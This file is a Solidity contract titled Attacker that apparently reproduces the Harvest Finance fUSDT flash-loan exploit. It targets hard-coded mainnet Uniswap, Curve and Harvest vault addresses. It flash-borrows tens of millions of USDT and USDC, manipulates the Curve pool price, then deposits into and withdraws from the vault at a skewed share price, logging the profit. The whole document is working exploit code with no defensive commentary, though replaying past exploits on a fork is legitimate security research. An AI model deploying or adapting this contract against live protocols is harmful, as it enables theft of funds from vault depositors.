pragma solidity >=0.8.0;
import "../interfaces/IUniswapV2Pair.sol";
import "../interfaces/IcurveYSwap.sol";
import "../interfaces/IERC20.sol";
import "../interfaces/IERC20USDT.sol";
import "../interfaces/IHarvestVault.sol";
import "hardhat/console.sol";

contract Attacker {
    IUniswapV2Pair USDT_WETH =
        IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair USDC_WETH =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IcurveYSwap curveYSwap =
        IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    // Harvest fUSDT Vault
    IHarvestVault fUSDT =
        IHarvestVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);

    IERC20USDT usdt = IERC20USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    uint256 constant USDT_LOAN = 50_000_000 * 10**6;
    uint256 constant USDT_REPAY = (USDT_LOAN * 100301) / 100000;

    uint256 constant USDC_LOAN = 11_200_000 * 10**6;
    uint256 constant USDC_REPAY = (USDC_LOAN * 100301) / 100000;

    uint256 usdtBal;
    uint256 usdcBal;

    address owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function run() public {
        require(msg.sender == owner);
        usdt.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);

        usdt.approve(address(fUSDT), type(uint256).max);

        usdt.approve(address(USDT_WETH), type(uint256).max);
        usdc.approve(address(USDC_WETH), type(uint256).max);

        balanceCheck("Starting");
        USDT_WETH.swap(0, USDT_LOAN, address(this), "data");
        balanceCheck("Profit");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) public {
        if (msg.sender == address(USDT_WETH)) {
            balanceCheck("USDT loan");
            // first entry
            USDC_WETH.swap(USDC_LOAN, 0, address(this), "data");
            usdt.transfer(address(USDT_WETH), USDT_REPAY);
        }

        if (msg.sender == address(USDC_WETH)) {
            balanceCheck("USDC loan");
            attack();
            usdc.transfer(address(USDC_WETH), USDC_REPAY);
        }
    }

    function attack() internal {
        // 1. swap usdc for usdt
        curveYSwap.exchange_underlying(
            1,
            2,
            usdc.balanceOf(address(this)),
            (usdc.balanceOf(address(this)) * 95) / 100
        );

        balanceCheck("after swap usdc for usdt");

        // 2. deposit usdt
        fUSDT.deposit(49_000_000 * 10**6);

        balanceCheck("after deposit usdt");

        // 3. swap usdt for usdc
        curveYSwap.exchange_underlying(
            2,
            1,
            (usdt.balanceOf(address(this)) * 93) / 100,
            (usdt.balanceOf(address(this)) * 88) / 100
        );

        balanceCheck("after swap usdt for usdc");

        fUSDT.withdraw(fUSDT.balanceOf(address(this)));

        balanceCheck("after withdraw fUSDT");
    }

    function balanceCheck(string memory title) internal {
        console.log("------------------------");
        console.log(title);
        usdcBal = usdc.balanceOf(address(this));
        usdtBal = usdt.balanceOf(address(this));
        console.log("USDC: ", usdcBal / 10**6);
        console.log("USDT: ", usdtBal / 10**6);
    }

    receive() external payable {}
}
